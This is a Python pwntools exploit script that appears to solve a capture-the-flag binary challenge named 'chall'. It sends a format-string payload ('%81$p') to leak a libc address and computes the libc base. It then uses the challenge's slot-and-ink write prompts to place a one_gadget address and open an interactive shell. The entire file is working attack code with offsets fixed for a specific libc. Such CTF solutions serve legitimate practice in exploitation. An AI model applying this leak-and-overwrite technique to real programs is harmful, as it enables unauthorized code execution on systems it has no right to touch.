#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall', checksec=False)
libc = ELF('/usr/lib/libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*greeting+1061
        b*greeting+844
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

sa(b'Name:', b'%81$p')

# a = p.recvuntil(b"[bouncer] Hah! I'll announce you to the whole market:")
p.recvuntil(b'0x')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak -0x276c1
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

one = 0xe5830 + libc.address

sa(b'[scribe] Choose where to start (slot index 0..128):\n', b'23')
sa(b'Choose a tiny adjustment inside the slot (0..15):\n', b'8')
sa(b'of ink? (max 8):\n', b'8')


sa(b'[scribe] Ink (raw bytes):\n', p64(one))

p.interactive()
